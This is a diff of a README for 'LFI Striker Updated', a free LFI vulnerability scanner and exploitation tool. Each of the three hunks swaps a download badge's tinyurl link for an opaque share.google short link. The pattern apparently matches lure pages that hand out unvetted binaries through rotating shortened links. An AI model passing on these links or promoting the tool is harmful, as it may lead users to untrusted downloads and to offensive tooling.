@@ -13,7 +13,7 @@
 
 <div align="center">
 
-[![Download LFI Striker Updated](https://img.shields.io/badge/Download-8B5CF6?style=for-the-badge&logo=github)](https://tinyurl.com/lfi-striker-updated)
+[![Download LFI Striker Updated](https://img.shields.io/badge/Download-8B5CF6?style=for-the-badge&logo=github)](https://share.google/eIk25bVWVArgzWJDW)
 
 </div>
 
@@ -70,7 +70,7 @@
 
 <div align="center">
 
-[![Download LFI Striker Updated](https://img.shields.io/badge/Download-8B5CF6?style=for-the-badge&logo=github)](https://tinyurl.com/lfi-striker-updated)
+[![Download LFI Striker Updated](https://img.shields.io/badge/Download-8B5CF6?style=for-the-badge&logo=github)](https://share.google/eIk25bVWVArgzWJDW)
 
 </div>
 
@@ -173,7 +173,7 @@ Automate LFI vulnerability detection and exploitation for free. **LFI Striker â€
 
 <div align="center">
 
-[![Download LFI Striker Updated](https://img.shields.io/badge/Download-8B5CF6?style=for-the-badge&logo=github)](https://tinyurl.com/lfi-striker-updated)
+[![Download LFI Striker Updated](https://img.shields.io/badge/Download-8B5CF6?style=for-the-badge&logo=github)](https://share.google/eIk25bVWVArgzWJDW)
 
 **Version 2.8.0** â€” Free LFI vulnerability scanner. May 2026 update. Zero cost. No payment.
 
